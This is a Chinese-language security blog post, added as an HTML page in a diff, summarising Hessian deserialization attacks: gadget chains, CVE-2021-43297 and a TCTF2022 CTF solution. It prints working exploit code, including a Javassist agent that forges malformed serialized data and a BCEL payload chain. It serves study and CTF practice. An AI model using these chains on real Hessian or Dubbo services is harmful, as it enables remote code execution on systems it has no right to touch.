@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            Hessian Deserialization Summary
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="关于版本"><a href="#关于版本" class="headerlink" title="关于版本"></a>关于版本</h1><p>hession和hession2都在同一个依赖里，就只有类名不同。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.66&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">import com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.caucho.hessian.io.HessianInput;</span><br><span class="line">import com.caucho.hessian.io.HessianOutput;</span><br></pre></td></tr></table></figure>
+
+<p>dubbo用的是alibaba版的hession</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hession/image-20231007144836618.png" alt="image-20231007144836618.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dubbo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Input;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.Hessian2Output;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.HessianInput;</span><br><span class="line">import com.alibaba.com.caucho.hessian.io.HessianOutput;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="原生hession的反序列化利用"><a href="#原生hession的反序列化利用" class="headerlink" title="原生hession的反序列化利用"></a>原生hession的反序列化利用</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>可利用的反序列化入口：反序列化对象最外层是HashMap时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HessianInput.readObject</span><br><span class="line">	SerializeFactory.readMap</span><br><span class="line">        _hashMapDeserializer = new MapDeserializer(HashMap.class);</span><br><span class="line">        return _hashMapDeserializer.readMap(in);</span><br><span class="line">        	map.put(in.readObject(), in.readObject()); //入口就在这里</span><br></pre></td></tr></table></figure>
+
+<h2 id="XString-Jackson-SignedObject"><a href="#XString-Jackson-SignedObject" class="headerlink" title="XString+Jackson+SignedObject"></a>XString+Jackson+SignedObject</h2><p>map.put-&gt;HotSwappableTargetSource.equals-&gt;XString.equals-&gt; POJONode.toString-&gt;getter</p>
+<p>至于为什么不直接调TemplateImpl的getter，因为TemplateImpl的<code>_tfactory</code>是<code>transient</code>的，hession反序列化之后他就是null。</p>
+<p>至于为什么jdk原生反序列化可以，因为TemplateImpl的readObject的最后一行有<code>_tfactory = new TransformerFactoryImpl();</code>。</p>
+<p>exp1，用HotSwappableTargetSource</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; byte[] serialize(T t) &#123;</span><br><span class="line">    byte[] data = null;</span><br><span class="line">    try &#123;</span><br><span class="line">    ByteArrayOutputStream os = new ByteArrayOutputStream();</span><br><span class="line">    HessianOutput output = new HessianOutput(os);</span><br><span class="line">    output.writeObject(t);</span><br><span class="line">    data = os.toByteArray();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static &lt;T&gt; T deserialize(byte[] data) &#123;</span><br><span class="line">    if (data == null) &#123;</span><br><span class="line">    return null;</span><br><span class="line">    &#125;</span><br><span class="line">    Object result = null;</span><br><span class="line">    try &#123;</span><br><span class="line">    ByteArrayInputStream is = new ByteArrayInputStream(data);</span><br><span class="line">    HessianInput input = new HessianInput(is);</span><br><span class="line">    result = input.readObject();</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return (T) result;</span><br><span class="line">&#125;</span><br><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    POJONode node = new POJONode(Gadget.getTemplateImpl(&quot;calc&quot;));</span><br><span class="line"></span><br><span class="line">    HotSwappableTargetSource hs1 = Gadget.getHotSwappableTargetSource(node);</span><br><span class="line"></span><br><span class="line">    map.put(hs1,&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">    HotSwappableTargetSource hs2 = Gadget.getHotSwappableTargetSource(1);</span><br><span class="line"></span><br><span class="line">    map.put(hs2,&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(hs2,&quot;target&quot;,new XString(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">    deserialize(serialize(map));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp2，不用HotSwappableTargetSource</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main2() throws Exception&#123;</span><br><span class="line">    HashMap&lt;Object, Object&gt; map1 = new HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();</span><br><span class="line">    HashMap&lt;Object, Object&gt; map3 = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    POJONode node1 = new POJONode(Gadget.getTemplateImpl(&quot;calc&quot;));</span><br><span class="line"></span><br><span class="line">    POJONode node2 = new POJONode(Gadget.getSingnedObject(node1));</span><br><span class="line">    /*</span><br><span class="line">    要注意下面3个map put的顺序。有时候会调用到 POJONode.equals</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    map2.put(&quot;yy&quot;,new XString(&quot;1&quot;));</span><br><span class="line">    map2.put(&quot;zZ&quot;,node2);</span><br><span class="line"></span><br><span class="line">    map3.put(map1,&quot;1&quot;);</span><br><span class="line">    map3.put(map2,&quot;2&quot;);</span><br><span class="line"></span><br><span class="line">    map1.put(&quot;yy&quot;,node2);</span><br><span class="line">    map1.put(&quot;zZ&quot;,new XString(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">    deserialize(serialize(map3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Rome-TODO"><a href="#Rome-TODO" class="headerlink" title="Rome &#x2F;&#x2F;TODO"></a>Rome &#x2F;&#x2F;TODO</h2><h2 id="JdbcRowSetImpl-TODO"><a href="#JdbcRowSetImpl-TODO" class="headerlink" title="JdbcRowSetImpl &#x2F;&#x2F;TODO"></a>JdbcRowSetImpl &#x2F;&#x2F;TODO</h2><h2 id="hession和hession2的序列化差异？"><a href="#hession和hession2的序列化差异？" class="headerlink" title="hession和hession2的序列化差异？"></a>hession和hession2的序列化差异？</h2><p>上面两个exp的serialize方法，给hession用可以，但是换成hession2就不行。（测试版本4.0.38，4.0.66都会）。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hession/image-20231007150922027.png" alt="image-20231007150922027.png"><br>debug发现，序列化数据是空的。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hession/image-20231007151028966.png" alt="image-20231007151028966.png"><br>要换成这种才行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; byte[] serialize(T t) &#123;</span><br><span class="line">    byte[] data = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        Hessian2Output output = new Hessian2Output();</span><br><span class="line">        output.writeObject(t);</span><br><span class="line">        data = (byte[])Util.getFieldValue(output,&quot;_buffer&quot;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="alibaba-hession"><a href="#alibaba-hession" class="headerlink" title="alibaba hession"></a>alibaba hession</h1><p>原生hessian底层反序列化时，用的unsafe创建对象，与构造函数无关。</p>
+<p>alibaba改写的hessian反序列化时，用的JavaDeserializer，先调用构造方法，属性传null，创建出对象后再设置属性。</p>
+<p>因为HotSwappableTargetSource和SignedObject构造方法传参null会报错，所以这两个用不了。</p>
+<p>下面是alibaba的hessian1，用上面的exp。报错<code>&#39;java.security.SignedObject&#39; could not be instantiated</code>，原因就是创建SignedObject对象时构造器传参null。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/hession/image-20231008100846193.png" alt="image-20231008100846193.png"></p>
+<h1 id="引发异常导致toString-CVE-2021-43297"><a href="#引发异常导致toString-CVE-2021-43297" class="headerlink" title="引发异常导致toString CVE-2021-43297"></a>引发异常导致toString CVE-2021-43297</h1><p>测试版本：下面两个都行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.dubbo&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;dubbo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.caucho&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;hessian&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.66&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大致原理：</p>
+<p>当读取序列化数据时，读取到一个tag，表示下一个数据是boolean数据。若手动修改该数据，使他不是boolean值，就会进入expect方法，在expect方法中，对这个脏数据readObject，然后再toString。</p>
+<p>所以构造序列化数据做法就是将触发toString的source对象覆盖到那个boolean值的位置。</p>
+<p>本来想尝试010手改序列化数据，为此专门debug他的序列化流程和反序列化流程。最后用简单demo对象手改成功了，但是复杂一点的就难弄，所以得自动化。</p>
+<h2 id="javaagent构造畸形序列化数据"><a href="#javaagent构造畸形序列化数据" class="headerlink" title="javaagent构造畸形序列化数据"></a>javaagent构造畸形序列化数据</h2><p>大致流程：给Hessian2Output类添加一个HashMap属性hellomap，用来存放source对象。用javaassist修改<code>Hessian2Output</code>的<code>writeBoolean</code>方法，从hellomap取出对象写入，而不写正常的boolean数据。</p>
+<p>使用时随便序列化一个含有boolean属性的对象，把source对象送进hellomap即可。writeBoolean写入恶意对象的操作只执行一次，才能不干扰其他序列化。</p>
+<p>MyAgent</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package example;</span><br><span class="line"></span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class MyAgent &#123;</span><br><span class="line"></span><br><span class="line">    public static void premain(String agentArgs, Instrumentation inst) &#123;</span><br><span class="line"></span><br><span class="line">        inst.addTransformer(new MyClassFileTransformer(),true);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>MyClassFileTransformer</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MyClassFileTransformer implements ClassFileTransformer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer)&#123;</span><br><span class="line"></span><br><span class="line">        String target2 = &quot;com.alibaba.com.caucho.hessian.io.Hessian2Output&quot;;</span><br><span class="line"></span><br><span class="line">        if (className2.equals(target2)) &#123;</span><br><span class="line">            System.out.println(&quot;Find the Inject Class: &quot;+target2);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            try &#123;</span><br><span class="line"></span><br><span class="line">                CtClass c = pool.getCtClass(className2);</span><br><span class="line">                System.out.println(&quot;hhhh&quot;);</span><br><span class="line">                CtMethod ctMethod = c.getDeclaredMethod(&quot;writeBoolean&quot;);</span><br><span class="line"></span><br><span class="line">                CtClass ctClass = pool.getCtClass(&quot;java.util.HashMap&quot;);</span><br><span class="line">                CtField ctField = new CtField(ctClass,&quot;hellomap&quot;,c);</span><br><span class="line"></span><br><span class="line">                c.addField(ctField);</span><br><span class="line">                ctMethod.setBody(&quot;&#123;\n&quot; +</span><br><span class="line">                        &quot;    if (SIZE &lt; _offset + 16) flush();\n&quot; +</span><br><span class="line">                        &quot;\n&quot; +</span><br><span class="line">                        &quot;    if(hellomap!=null &amp;&amp; hellomap.get(\&quot;flag\&quot;)!=null)&#123;\n&quot; +</span><br><span class="line">                        &quot;hellomap.remove(\&quot;flag\&quot;);&quot; +</span><br><span class="line">                        &quot;writeObject(hellomap.get(\&quot;value\&quot;));\n&quot; +</span><br><span class="line">                        &quot;    &#125;else&#123;\n&quot; +</span><br><span class="line">                        &quot;        if ($1)\n&quot; +</span><br><span class="line">                        &quot;        _buffer[_offset++] = (byte) &#x27;T&#x27;;\n&quot; +</span><br><span class="line">                        &quot;        else\n&quot; +</span><br><span class="line">                        &quot;        _buffer[_offset++] = (byte) &#x27;F&#x27;;\n&quot; +</span><br><span class="line">                        &quot;    &#125;\n&quot; +</span><br><span class="line">                        &quot;\n&quot; +</span><br><span class="line">                        &quot;&#125;&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                byte[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                return bytes;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化方法改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static &lt;T&gt; byte[] badSerialize(T t,Object source) &#123;</span><br><span class="line">    byte[] data = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        ByteArrayOutputStream os = new ByteArrayOutputStream();</span><br><span class="line">        Hessian2Output output = new Hessian2Output(os);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;flag&quot;,1);</span><br><span class="line">        map.put(&quot;value&quot;,source);</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(output,&quot;hellomap&quot;,map);</span><br><span class="line">        output.getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="line">        output.writeObject(t);</span><br><span class="line"></span><br><span class="line">        data = (byte[])Util.getFieldValue(output,&quot;_buffer&quot;);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    return data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ToStringBean</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class ToStringBean implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Bool</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Bool implements Serializable &#123;</span><br><span class="line"></span><br><span class="line">    String name = &quot;123&quot;;</span><br><span class="line">    boolean sex = true;</span><br><span class="line">    String addr = &quot;addrrrrr&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Main</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  public static void main(String[] args) throws Exception&#123;</span><br><span class="line">deserialize(badSerialize(new Bool(),new ToStringBean()));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行可弹计算器，说明触发了ToStringBeande的toString</p>
+<h1 id="TCTF2022-Hessian-onlyJdk"><a href="#TCTF2022-Hessian-onlyJdk" class="headerlink" title="TCTF2022 Hessian-onlyJdk"></a>TCTF2022 Hessian-onlyJdk</h1><p>hessian + 原生jdk反序列化</p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/21/TCTF2022%20_%20Hessian-onlyJdk/">https://boogipop.com/2023/03/21/TCTF2022%20_%20Hessian-onlyJdk/</a></p>
+<p>考点：</p>
+<p>hessian引异常触发toString</p>
+<p>PKCS9Attributes.toString -&gt; UIDefaults.get -&gt;SwingLazyValue.createValue -&gt; invoke （任意类的public static 方法）</p>
+<p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">      JavaClass javaClass = Repository.lookupClass(Evill.class);</span><br><span class="line">      String encode = Utility.encode(javaClass.getBytes(), true);</span><br><span class="line">      String payload = &quot;$$BCEL$$&quot;+encode;</span><br><span class="line"></span><br><span class="line">      PKCS9Attributes s = Util.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">      UIDefaults uiDefaults = new UIDefaults();</span><br><span class="line"></span><br><span class="line">      uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue(&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;, &quot;_main&quot;, new Object[]&#123;new String[]&#123;payload&#125;&#125;));</span><br><span class="line"></span><br><span class="line">      Util.setFieldValue(s,&quot;attributes&quot;,uiDefaults);</span><br><span class="line"></span><br><span class="line">//只是借用一下Hessian2Input的boolean属性，没别的作用。</span><br><span class="line">      Hessian2Input hessian2Input = new Hessian2Input();</span><br><span class="line"></span><br><span class="line">      deserialize(badSerialize(hessian2Input,s));</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1193">https://goodapple.top/archives/1193</a></p>
+<p><a target="_blank" rel="noopener" href="https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">https://pupil857.github.io/2022/12/08/NCTF2022-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/21/TCTF2022%20_%20Hessian-onlyJdk/">https://boogipop.com/2023/03/21/TCTF2022%20_%20Hessian-onlyJdk/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kingbridge/articles/16717030.html">https://www.cnblogs.com/kingbridge/articles/16717030.html</a></p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E7%89%88%E6%9C%AC"><span class="toc-text">关于版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%94%9Fhession%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">原生hession的反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XString-Jackson-SignedObject"><span class="toc-text">XString+Jackson+SignedObject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rome-TODO"><span class="toc-text">Rome &#x2F;&#x2F;TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl-TODO"><span class="toc-text">JdbcRowSetImpl &#x2F;&#x2F;TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hession%E5%92%8Chession2%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%AE%E5%BC%82%EF%BC%9F"><span class="toc-text">hession和hession2的序列化差异？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#alibaba-hession"><span class="toc-text">alibaba hession</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E5%8F%91%E5%BC%82%E5%B8%B8%E5%AF%BC%E8%87%B4toString-CVE-2021-43297"><span class="toc-text">引发异常导致toString CVE-2021-43297</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#javaagent%E6%9E%84%E9%80%A0%E7%95%B8%E5%BD%A2%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE"><span class="toc-text">javaagent构造畸形序列化数据</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TCTF2022-Hessian-onlyJdk"><span class="toc-text">TCTF2022 Hessian-onlyJdk</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
